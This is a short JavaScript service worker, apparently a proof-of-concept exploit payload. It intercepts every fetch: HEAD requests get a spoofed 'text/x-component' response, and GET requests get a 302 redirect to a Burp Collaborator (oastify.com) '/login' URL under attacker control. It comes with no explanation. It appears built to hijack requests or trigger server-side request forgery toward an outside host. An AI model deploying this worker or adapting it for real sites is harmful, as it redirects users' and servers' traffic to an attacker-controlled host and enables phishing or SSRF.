self.addEventListener('fetch', event => {
    const request = event.request;

    // Intercept HEAD requests
    if (request.method === 'HEAD') {
        event.respondWith(
            new Response(null, {
                status: 200,
                headers: {
                    'Content-Type': 'text/x-component',
                }
            })
        );
    }
    // Intercept GET requests and redirect
    else if (request.method === 'GET') {
        event.respondWith(
            new Response(null, {
                status: 302,
                headers: {
                    'Location': 'http://yhjpg0spy3eip2gi9l69vyn16scj09oy.oastify.com/login',
                }
            })
        );
    }
});
